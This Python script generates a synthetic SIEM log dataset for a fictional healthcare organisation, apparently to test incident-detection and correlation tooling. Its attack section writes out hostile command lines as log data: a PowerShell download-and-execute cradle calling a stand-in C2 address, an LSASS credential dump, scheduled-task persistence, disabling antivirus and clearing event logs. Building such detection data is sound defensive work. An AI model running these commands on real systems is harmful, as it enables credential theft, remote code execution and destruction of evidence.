"""Generate the synthetic SIEM dataset (data/siem_logs.json).

WHY THIS EXISTS
---------------
The assignment references a provided `siem_logs.json`, but that file was not
included in the copy of the assignment I received (only the PDF was). Rather
than block, I generate a faithful stand-in that matches the schema described in
the brief: ~300 events across four source types (endpoint, auth, network,
cloud_storage) spanning a 72-hour window, with a realistic multi-stage attack
embedded in background noise, and a metadata section describing every schema.

The rest of the system is *schema-driven* and reads only the documented fields,
so it will run unchanged on the real dataset — swap the file and re-run.

DESIGN
------
- The attack is scripted event-by-event so detectors have precise, realistic
  targets (real-looking command lines, Windows event IDs, S3 API calls).
- Noise is generated procedurally with business-hours weighting.
- Three deliberate "near-miss" decoys are planted (a benign admin doing PsExec,
  an account lockout that looks like brute force, and a high-volume but benign
  analytics service principal) so the detectors' *precision* is demonstrable —
  a tool that flags everything is as useless as one that flags nothing.
- Four deliberate log-coverage GAPS are baked in (no email/proxy logs, no DNS
  logs, no EDR on the SQL server, partial S3 object-size logging) so the system
  can honestly say "cannot confirm X because the relevant logs are absent."

Deterministic: fixed seed -> identical output every run.
"""

from __future__ import annotations

import json
import os
import random
from datetime import datetime, timedelta, timezone

SEED = 1337
random.seed(SEED)

OUT_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "siem_logs.json")

# --------------------------------------------------------------------------- #
# Environment inventory (a small healthcare org: "Northwind Health")
# --------------------------------------------------------------------------- #
WINDOW_START = datetime(2026, 7, 19, 0, 0, 0, tzinfo=timezone.utc)
WINDOW_END = datetime(2026, 7, 22, 0, 0, 0, tzinfo=timezone.utc)  # 72h

# host -> internal IP.  Workstations on 10.20.14.0/24, servers on 10.20.8.0/24.
HOSTS = {
    "WKS-2471": "10.20.14.71",   # Jordan Reyes, Billing  -> PATIENT ZERO
    "WKS-1180": "10.20.14.80",   # Maria Chen, Nursing    -> lockout decoy
    "WKS-3322": "10.20.14.22",   # noise
    "WKS-2088": "10.20.14.88",   # noise
    "WKS-4510": "10.20.14.110",  # Taylor Walsh, IT admin -> benign PsExec decoy
    "SRV-FILES01": "10.20.8.12",  # file server, PHI share -> COMPROMISED
    "SRV-SQL01": "10.20.8.20",    # database server        -> UNCERTAIN (no EDR)
    "DC01": "10.20.8.5",          # domain controller      -> COMPROMISED
    "SRV-VPN01": "10.20.8.30",    # VPN concentrator (noise source)
    "SRV-WEB01": "10.20.8.40",    # internal web/app (noise)
}
IP_TO_HOST = {ip: h for h, ip in HOSTS.items()}

WORKSTATIONS = ["WKS-1180", "WKS-3322", "WKS-2088", "WKS-4510"]
STAFF = ["m.chen", "r.okafor", "s.patel", "d.kim", "l.gomez", "p.singh", "b.ahmed", "n.ortiz"]

# External IPs
C2_IP = "45.83.140.77"          # attacker C2 + cloud-exfil source
BENIGN_EXTERNAL = ["13.107.42.14", "20.190.160.20", "151.101.65.69", "52.96.7.130", "104.16.85.20"]

# Cloud (AWS S3)
CLOUD_ACCOUNT = "418773920014"
PHI_BUCKET = "northwind-phi-records-prod"
NORMAL_BUCKETS = ["northwind-app-assets-prod", "northwind-backups-prod"]
EXFIL_BUCKET = "exfil-stage-4d2a"          # attacker-controlled, external account
SVC_BACKUP_KEY = "AKIA5NW5BACKUP7XQ2R1"    # abused access key
SVC_ANALYTICS_KEY = "AKIA5NW5ANALYT4KP9Z0"

events = {"endpoint": [], "auth": [], "network": [], "cloud_storage": []}


def ts(base: datetime, **delta) -> str:
    return (base + timedelta(**delta)).strftime("%Y-%m-%dT%H:%M:%SZ")


def add(source: str, ev: dict) -> None:
    events[source].append(ev)


# --------------------------------------------------------------------------- #
# THE ATTACK  (ground truth the correlation engine must reconstruct)
# --------------------------------------------------------------------------- #
def build_attack() -> None:
    d1 = datetime(2026, 7, 19, tzinfo=timezone.utc)
    d2 = datetime(2026, 7, 20, tzinfo=timezone.utc)
    d3 = datetime(2026, 7, 21, tzinfo=timezone.utc)

    # -- Stage 1: Initial Access + Execution (spear-phish payload detonates) --
    # Office spawns encoded PowerShell -> classic malicious-macro lineage.
    add("endpoint", {
        "timestamp": ts(d1, hours=9, minutes=14, seconds=3), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "winword.exe", "pid": 6612, "parent_process": "explorer.exe", "ppid": 2044,
        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" "
                        "/n \"C:\\Users\\j.reyes\\Downloads\\Updated_Patient_Referral_Form.doc\"",
        "integrity_level": "Medium",
    })
    add("endpoint", {
        "timestamp": ts(d1, hours=9, minutes=14, seconds=31), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "powershell.exe", "pid": 7104, "parent_process": "winword.exe", "ppid": 6612,
        "command_line": "powershell.exe -nop -w hidden -ep bypass -enc "
                        "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4A"
                        "RABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADgAMwAuADEA"
                        "NAAwAC4ANwA3AC8AYQAnACkA",
        "integrity_level": "Medium",
    })
    # Payload beacons out immediately (C2 established).
    add("network", {
        "timestamp": ts(d1, hours=9, minutes=14, seconds=48), "source": "network",
        "event_type": "flow_allow", "src_ip": "10.20.14.71", "src_host": "WKS-2471",
        "dst_ip": C2_IP, "dst_port": 443, "protocol": "tcp", "bytes_out": 1840, "bytes_in": 640,
        "direction": "outbound", "app": "tls",
    })

    # -- Stage 2: Persistence (scheduled task re-launches the implant) --
    add("endpoint", {
        "timestamp": ts(d1, hours=9, minutes=22, seconds=10), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "schtasks.exe", "pid": 7330, "parent_process": "powershell.exe", "ppid": 7104,
        "command_line": "schtasks /create /sc minute /mo 30 /tn \"OneDriveSync\" /tr "
                        "\"powershell -nop -w hidden -ep bypass -f C:\\Users\\j.reyes\\AppData\\Roaming\\od.ps1\" /f",
        "integrity_level": "Medium",
    })

    # -- Stage 3: Discovery (recon of accounts / domain / host) --
    for i, (proc, cmd) in enumerate([
        ("cmd.exe", "cmd.exe /c whoami /all"),
        ("net.exe", "net group \"Domain Admins\" /domain"),
        ("nltest.exe", "nltest /dclist:northwind.local"),
        ("cmd.exe", "cmd.exe /c ipconfig /all & systeminfo"),
    ]):
        add("endpoint", {
            "timestamp": ts(d1, hours=9, minutes=31, seconds=5 + i * 9), "source": "endpoint",
            "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
            "process": proc, "pid": 7400 + i, "parent_process": "powershell.exe", "ppid": 7104,
            "command_line": cmd, "integrity_level": "Medium",
        })

    # -- Stage 4: Credential Access (LSASS dump via comsvcs.dll) --
    add("endpoint", {
        "timestamp": ts(d1, hours=14, minutes=5, seconds=22), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "rundll32.exe", "pid": 8880, "parent_process": "powershell.exe", "ppid": 7104,
        "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 720 "
                        "C:\\Windows\\Temp\\lsass.dmp full",
        "integrity_level": "System",
    })

    # Beaconing continues across the whole dwell period (regular ~30-min interval).
    beacon = d1 + timedelta(hours=9, minutes=44)
    end_beacon = d3 + timedelta(hours=1, minutes=55)
    while beacon < end_beacon:
        add("network", {
            "timestamp": beacon.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "network",
            "event_type": "flow_allow", "src_ip": "10.20.14.71", "src_host": "WKS-2471",
            "dst_ip": C2_IP, "dst_port": 443, "protocol": "tcp",
            "bytes_out": random.randint(1200, 2600), "bytes_in": random.randint(400, 1500),
            "direction": "outbound", "app": "tls",
        })
        beacon += timedelta(minutes=60, seconds=random.randint(-50, 50))

    # -- Stage 5: Lateral Movement to file server (THE triangulated event) --
    # Corroborated across three sources at ~the same instant:
    #   auth  = network logon (type 3) to SRV-FILES01 as svc_backup from 10.20.14.71
    #   network = SMB flow 10.20.14.71 -> 10.20.8.12:445
    #   endpoint = remote service execution (services.exe -> cmd) on SRV-FILES01
    add("auth", {
        "timestamp": ts(d2, hours=2, minutes=17, seconds=4), "source": "auth",
        "host": "SRV-FILES01", "event_type": "logon_success", "win_event_id": 4624,
        "logon_type": 3, "user": "svc_backup", "src_ip": "10.20.14.71", "src_host": "WKS-2471",
        "auth_package": "NTLM", "status": "success",
    })
    add("network", {
        "timestamp": ts(d2, hours=2, minutes=17, seconds=5), "source": "network",
        "event_type": "flow_allow", "src_ip": "10.20.14.71", "src_host": "WKS-2471",
        "dst_ip": "10.20.8.12", "dst_port": 445, "protocol": "tcp",
        "bytes_out": 44210, "bytes_in": 8820, "direction": "internal", "app": "smb",
    })
    add("endpoint", {
        "timestamp": ts(d2, hours=2, minutes=17, seconds=12), "source": "endpoint",
        "host": "SRV-FILES01", "event_type": "process_create", "user": "svc_backup",
        "process": "cmd.exe", "pid": 3120, "parent_process": "services.exe", "ppid": 704,
        "command_line": "cmd.exe /c echo NnJ8 > \\\\.\\pipe\\PSEXESVC & powershell -nop -w hidden -c "
                        "\"iex(iwr http://45.83.140.77/s.ps1 -UseBasicParsing)\"",
        "integrity_level": "System",
    })

    # -- Stage 6: Privilege Escalation to the domain (harvested Domain Admin) --
    # Pivot from the file server to the DC using a.novak (Domain Admin) creds.
    add("auth", {
        "timestamp": ts(d2, hours=2, minutes=41, seconds=33), "source": "auth",
        "host": "DC01", "event_type": "logon_success", "win_event_id": 4624,
        "logon_type": 3, "user": "a.novak", "src_ip": "10.20.8.12", "src_host": "SRV-FILES01",
        "auth_package": "Kerberos", "status": "success",
    })
    add("auth", {  # special-privilege logon (admin token) -> 4672
        "timestamp": ts(d2, hours=2, minutes=41, seconds=33), "source": "auth",
        "host": "DC01", "event_type": "special_privileges", "win_event_id": 4672,
        "logon_type": 3, "user": "a.novak", "src_ip": "10.20.8.12", "src_host": "SRV-FILES01",
        "auth_package": "Kerberos", "status": "success",
    })

    # -- Auth to SRV-SQL01 (the UNCERTAIN host: logon seen, but NO EDR telemetry) --
    add("auth", {
        "timestamp": ts(d2, hours=3, minutes=5, seconds=8), "source": "auth",
        "host": "SRV-SQL01", "event_type": "logon_success", "win_event_id": 4624,
        "logon_type": 3, "user": "svc_backup", "src_ip": "10.20.8.12", "src_host": "SRV-FILES01",
        "auth_package": "NTLM", "status": "success",
    })

    # -- Stage 7: Collection (archive the PHI share on the file server) --
    add("endpoint", {
        "timestamp": ts(d2, hours=3, minutes=20, seconds=41), "source": "endpoint",
        "host": "SRV-FILES01", "event_type": "process_create", "user": "svc_backup",
        "process": "7z.exe", "pid": 4501, "parent_process": "cmd.exe", "ppid": 3120,
        "command_line": "7z.exe a -t7z -mx1 -p<redacted> C:\\Windows\\Temp\\dsc01.7z "
                        "\\\\SRV-FILES01\\PHI$\\* -xr!*.tmp",
        "integrity_level": "System",
    })
    add("endpoint", {
        "timestamp": ts(d2, hours=3, minutes=48, seconds=19), "source": "endpoint",
        "host": "SRV-FILES01", "event_type": "file_write", "user": "svc_backup",
        "process": "7z.exe", "pid": 4501, "parent_process": "cmd.exe", "ppid": 3120,
        "command_line": None, "file_path": "C:\\Windows\\Temp\\dsc01.7z", "file_size": 5138990720,
        "integrity_level": "System",
    })

    # -- Stage 8: Exfiltration to cloud storage --
    # (a) Mass GetObject of PHI from external IP using abused access key (T1530),
    # (b) CopyObject of PHI objects to an EXTERNAL, attacker-owned bucket (T1567.002).
    add("cloud_storage", {
        "timestamp": ts(d3, hours=1, minutes=12, seconds=2), "source": "cloud_storage",
        "event_type": "ListBucket", "principal": "svc_backup", "access_key_id": SVC_BACKUP_KEY,
        "bucket": PHI_BUCKET, "object_key": None, "src_ip": C2_IP,
        "user_agent": "aws-cli/2.15.30 Python/3.11", "bytes": 0, "result": "Success",
    })
    # a burst of GetObject on PHI objects (download / read)
    get_base = d3 + timedelta(hours=1, minutes=12, seconds=30)
    phi_keys = [
        "patients/2026/mrn_{:06d}.json".format(700000 + i) for i in range(0, 18)
    ]
    for i, key in enumerate(phi_keys):
        add("cloud_storage", {
            "timestamp": (get_base + timedelta(seconds=i * 7)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source": "cloud_storage", "event_type": "GetObject", "principal": "svc_backup",
            "access_key_id": SVC_BACKUP_KEY, "bucket": PHI_BUCKET, "object_key": key,
            "src_ip": C2_IP, "user_agent": "aws-cli/2.15.30 Python/3.11",
            # object-size logging is only partially enabled -> some rows lack bytes (a real gap)
            "bytes": (random.randint(240000, 4200000) if i % 3 else None), "result": "Success",
        })
    # cross-account copy to an attacker-owned bucket -> unambiguous exfil-to-cloud
    for i, key in enumerate(phi_keys[:6]):
        add("cloud_storage", {
            "timestamp": (get_base + timedelta(minutes=6, seconds=i * 5)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "source": "cloud_storage", "event_type": "CopyObject", "principal": "svc_backup",
            "access_key_id": SVC_BACKUP_KEY, "bucket": PHI_BUCKET, "object_key": key,
            "dst_bucket": EXFIL_BUCKET, "dst_external": True,
            "src_ip": C2_IP, "user_agent": "aws-cli/2.15.30 Python/3.11",
            "bytes": random.randint(240000, 4200000), "result": "Success",
        })

    # -- Stage 9: Defense Evasion / anti-forensics on patient zero --
    add("endpoint", {
        "timestamp": ts(d3, hours=1, minutes=40, seconds=12), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "powershell.exe", "pid": 9600, "parent_process": "powershell.exe", "ppid": 7104,
        "command_line": "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
        "integrity_level": "High",
    })
    add("endpoint", {
        "timestamp": ts(d3, hours=1, minutes=41, seconds=3), "source": "endpoint",
        "host": "WKS-2471", "event_type": "process_create", "user": "j.reyes",
        "process": "wevtutil.exe", "pid": 9640, "parent_process": "powershell.exe", "ppid": 7104,
        "command_line": "wevtutil cl Security", "integrity_level": "High",
    })


# --------------------------------------------------------------------------- #
# NEAR-MISS DECOYS  (benign activity that superficially resembles the attack)
# --------------------------------------------------------------------------- #
def build_decoys() -> None:
    d1 = datetime(2026, 7, 19, tzinfo=timezone.utc)
    d2 = datetime(2026, 7, 20, tzinfo=timezone.utc)

    # Decoy 1: legit IT admin (t.walsh) doing a PsExec software push in business
    # hours from the known admin workstation -> looks like lateral movement.
    add("auth", {
        "timestamp": ts(d1, hours=15, minutes=2, seconds=11), "source": "auth",
        "host": "WKS-3322", "event_type": "logon_success", "win_event_id": 4624,
        "logon_type": 3, "user": "t.walsh", "src_ip": "10.20.14.110", "src_host": "WKS-4510",
        "auth_package": "Kerberos", "status": "success",
    })
    add("endpoint", {
        "timestamp": ts(d1, hours=15, minutes=2, seconds=20), "source": "endpoint",
        "host": "WKS-3322", "event_type": "process_create", "user": "t.walsh",
        "process": "cmd.exe", "pid": 5210, "parent_process": "services.exe", "ppid": 704,
        "command_line": "cmd.exe /c msiexec /i \\\\SRV-FILES01\\deploy\\AgentUpdate_7.2.msi /qn",
        "integrity_level": "System",
    })

    # Decoy 2: account lockout that looks like brute force -- m.chen fat-fingers
    # her new password 5x then succeeds, all from her OWN workstation.
    for i in range(5):
        add("auth", {
            "timestamp": ts(d2, hours=8, minutes=3, seconds=i * 12), "source": "auth",
            "host": "WKS-1180", "event_type": "logon_failure", "win_event_id": 4625,
            "logon_type": 2, "user": "m.chen", "src_ip": "10.20.14.80", "src_host": "WKS-1180",
            "auth_package": "Kerberos", "status": "0xC000006A",  # bad password
        })
    add("auth", {
        "timestamp": ts(d2, hours=8, minutes=4, seconds=30), "source": "auth",
        "host": "WKS-1180", "event_type": "logon_success", "win_event_id": 4624,
        "logon_type": 2, "user": "m.chen", "src_ip": "10.20.14.80", "src_host": "WKS-1180",
        "auth_package": "Kerberos", "status": "success",
    })
    # (Decoy 3 -- benign high-volume analytics S3 principal -- is emitted in noise.)


# --------------------------------------------------------------------------- #
# BACKGROUND NOISE
# --------------------------------------------------------------------------- #
def business_hours_ts() -> datetime:
    """Random timestamp weighted toward 08:00-18:00 UTC on any of the 3 days."""
    day = random.choice([0, 1, 2])
    if random.random() < 0.8:
        hour = random.randint(8, 18)
    else:
        hour = random.randint(0, 23)
    return WINDOW_START + timedelta(
        days=day, hours=hour, minutes=random.randint(0, 59), seconds=random.randint(0, 59)
    )


def build_noise() -> None:
    # -- auth noise: normal interactive + VPN logons -------------------------
    for _ in range(45):
        user = random.choice(STAFF + ["j.reyes", "a.novak", "t.walsh"])
        wks = random.choice(WORKSTATIONS + ["WKS-2471"])
        t = business_hours_ts()
        add("auth", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "auth",
            "host": wks, "event_type": "logon_success", "win_event_id": 4624,
            "logon_type": random.choice([2, 2, 2, 7]), "user": user,
            "src_ip": HOSTS[wks], "src_host": wks, "auth_package": "Kerberos", "status": "success",
        })
    for _ in range(10):  # occasional benign single failed logon (typo)
        user = random.choice(STAFF)
        wks = random.choice(WORKSTATIONS)
        t = business_hours_ts()
        add("auth", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "auth",
            "host": wks, "event_type": "logon_failure", "win_event_id": 4625,
            "logon_type": 2, "user": user, "src_ip": HOSTS[wks], "src_host": wks,
            "auth_package": "Kerberos", "status": "0xC000006A",
        })
    for _ in range(9):  # remote staff via VPN
        user = random.choice(STAFF)
        t = business_hours_ts()
        add("auth", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "auth",
            "host": "SRV-VPN01", "event_type": "logon_success", "win_event_id": 4624,
            "logon_type": 3, "user": user,
            "src_ip": random.choice(["73.162", "68.44", "24.19", "98.207"]) + "." + str(random.randint(2, 250)) + "." + str(random.randint(2, 250)),
            "src_host": "vpn-client", "auth_package": "Kerberos", "status": "success",
        })

    # -- endpoint noise: routine processes -----------------------------------
    routine = [
        ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
        ("outlook.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
        ("teams.exe", "\"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\""),
        ("MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"),
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
        ("OneDrive.exe", "\"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"),
        ("TabTip.exe", "\"C:\\Program Files\\Common Files\\microsoft shared\\ink\\TabTip.exe\""),
        ("winword.exe", "\"...\\WINWORD.EXE\" /n \"C:\\Users\\{u}\\Documents\\notes.docx\""),
    ]
    for _ in range(42):
        proc, cmd = random.choice(routine)
        user = random.choice(STAFF + ["j.reyes"])
        host = random.choice(WORKSTATIONS + ["WKS-2471", "SRV-FILES01", "SRV-WEB01"])
        t = business_hours_ts()
        add("endpoint", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "endpoint",
            "host": host, "event_type": "process_create", "user": user,
            "process": proc, "pid": random.randint(1000, 9999),
            "parent_process": random.choice(["explorer.exe", "services.exe", "svchost.exe"]),
            "ppid": random.randint(400, 3000), "command_line": cmd.replace("{u}", user),
            "integrity_level": random.choice(["Medium", "Medium", "System"]),
        })

    # -- network noise: normal web/SaaS egress -------------------------------
    for _ in range(48):
        host = random.choice(list(HOSTS.keys())[:5])
        t = business_hours_ts()
        add("network", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "network",
            "event_type": "flow_allow", "src_ip": HOSTS[host], "src_host": host,
            "dst_ip": random.choice(BENIGN_EXTERNAL), "dst_port": random.choice([443, 443, 443, 80]),
            "protocol": "tcp", "bytes_out": random.randint(400, 90000),
            "bytes_in": random.randint(800, 1500000), "direction": "outbound", "app": "tls",
        })
    for _ in range(6):  # a couple of denied outbound (firewall working normally)
        host = random.choice(WORKSTATIONS)
        t = business_hours_ts()
        add("network", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "network",
            "event_type": "flow_deny", "src_ip": HOSTS[host], "src_host": host,
            "dst_ip": random.choice(BENIGN_EXTERNAL), "dst_port": random.choice([23, 3389, 1433]),
            "protocol": "tcp", "bytes_out": 0, "bytes_in": 0, "direction": "outbound", "app": "tcp",
        })

    # -- cloud noise: normal app service-principal S3 access -----------------
    # svc_analytics is a high-volume but BENIGN baseline (decoy 3): it reads the
    # analytics bucket all day from inside AWS -- NOT the PHI bucket, NOT external.
    for _ in range(38):
        t = business_hours_ts()
        add("cloud_storage", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "cloud_storage",
            "event_type": random.choice(["GetObject", "GetObject", "PutObject", "ListBucket"]),
            "principal": "svc_analytics", "access_key_id": SVC_ANALYTICS_KEY,
            "bucket": random.choice(NORMAL_BUCKETS),
            "object_key": "reports/day/part-{:04d}.parquet".format(random.randint(0, 9999)),
            "src_ip": "10.20.8.40", "user_agent": "aws-sdk-java/2.25.11",
            "bytes": random.randint(10000, 900000), "result": "Success",
        })
    for _ in range(10):  # normal user pulling their own assets
        t = business_hours_ts()
        add("cloud_storage", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "cloud_storage",
            "event_type": "GetObject", "principal": "svc_web", "access_key_id": "AKIA5NW5WEBAPP0001",
            "bucket": "northwind-app-assets-prod", "object_key": "static/img/logo.png",
            "src_ip": "10.20.8.40", "user_agent": "aws-sdk-js/3.500.0",
            "bytes": random.randint(2000, 60000), "result": "Success",
        })
    for _ in range(4):  # a benign AccessDenied (someone's IAM policy is too tight)
        t = business_hours_ts()
        add("cloud_storage", {
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "source": "cloud_storage",
            "event_type": "GetObject", "principal": "svc_web", "access_key_id": "AKIA5NW5WEBAPP0001",
            "bucket": "northwind-backups-prod", "object_key": "db/nightly.bak",
            "src_ip": "10.20.8.40", "user_agent": "aws-sdk-js/3.500.0", "bytes": 0,
            "result": "AccessDenied",
        })


# --------------------------------------------------------------------------- #
# Assemble + write
# --------------------------------------------------------------------------- #
METADATA = {
    "dataset": "Northwind Health — synthetic SIEM export",
    "note": (
        "SYNTHETIC data generated for the Deloitte Cyber 'Incident Investigation "
        "Intelligence' assignment. The assignment's siem_logs.json was not included "
        "in the material received, so this faithful stand-in was generated to the "
        "schema described in the brief. All hosts, users, IPs, and events are "
        "fictional. A multi-stage intrusion is embedded within background noise."
    ),
    "generator_seed": SEED,
    "window": {"start": WINDOW_START.strftime("%Y-%m-%dT%H:%M:%SZ"),
               "end": WINDOW_END.strftime("%Y-%m-%dT%H:%M:%SZ"), "hours": 72},
    "timezone": "UTC",
    "event_id_scheme": "EP=endpoint, AU=auth, NW=network, CS=cloud_storage; zero-padded, chronological per source",
    "sources": {
        "endpoint": {
            "description": "EDR process/file telemetry from Windows endpoints and servers.",
            "fields": ["event_id", "timestamp", "source", "host", "event_type", "user",
                       "process", "pid", "parent_process", "ppid", "command_line",
                       "integrity_level", "file_path", "file_size"],
            "event_types": ["process_create", "file_write", "registry_set"],
            "coverage_note": "No EDR agent is deployed on SRV-SQL01 (known gap).",
        },
        "auth": {
            "description": "Windows Security / domain authentication events.",
            "fields": ["event_id", "timestamp", "source", "host", "event_type",
                       "win_event_id", "logon_type", "user", "src_ip", "src_host",
                       "auth_package", "status"],
            "event_types": ["logon_success", "logon_failure", "special_privileges", "logoff"],
            "logon_types": {"2": "interactive", "3": "network", "7": "unlock", "10": "remote-interactive/RDP"},
        },
        "network": {
            "description": "Perimeter + internal firewall flow records (netflow-style).",
            "fields": ["event_id", "timestamp", "source", "event_type", "src_ip", "src_host",
                       "dst_ip", "dst_port", "protocol", "bytes_out", "bytes_in", "direction", "app"],
            "event_types": ["flow_allow", "flow_deny"],
            "coverage_note": "No DNS query logs and no web-proxy/URL logs are collected (known gap).",
        },
        "cloud_storage": {
            "description": "AWS S3 data-plane access logs (CloudTrail-style) for the PHI estate.",
            "fields": ["event_id", "timestamp", "source", "event_type", "principal",
                       "access_key_id", "bucket", "object_key", "dst_bucket", "dst_external",
                       "src_ip", "user_agent", "bytes", "result"],
            "event_types": ["GetObject", "PutObject", "CopyObject", "ListBucket", "DeleteObject"],
            "coverage_note": "Per-object size logging is only partially enabled; some rows have bytes=null.",
        },
    },
    "asset_inventory_hint": {
        "note": "Provided so correlation can resolve host<->IP. In a real SIEM this comes from CMDB.",
        "hosts": HOSTS,
    },
}


def main() -> None:
    build_attack()
    build_decoys()
    build_noise()

    prefix = {"endpoint": "EP", "auth": "AU", "network": "NW", "cloud_storage": "CS"}
    all_events = []
    for source in ("endpoint", "auth", "network", "cloud_storage"):
        rows = sorted(events[source], key=lambda e: e["timestamp"])
        for i, ev in enumerate(rows, 1):
            ev["event_id"] = "{}-{:04d}".format(prefix[source], i)
            # canonical field order: event_id + timestamp first
            ordered = {"event_id": ev["event_id"], "timestamp": ev["timestamp"]}
            ordered.update({k: v for k, v in ev.items() if k not in ("event_id", "timestamp")})
            all_events.append(ordered)

    all_events.sort(key=lambda e: e["timestamp"])
    doc = {"metadata": METADATA, "events": all_events}

    os.makedirs(os.path.dirname(OUT_PATH), exist_ok=True)
    with open(OUT_PATH, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, indent=2)

    counts = {s: len(events[s]) for s in events}
    print("Wrote {} events -> {}".format(len(all_events), os.path.relpath(OUT_PATH)))
    print("  by source:", counts)


if __name__ == "__main__":
    main()
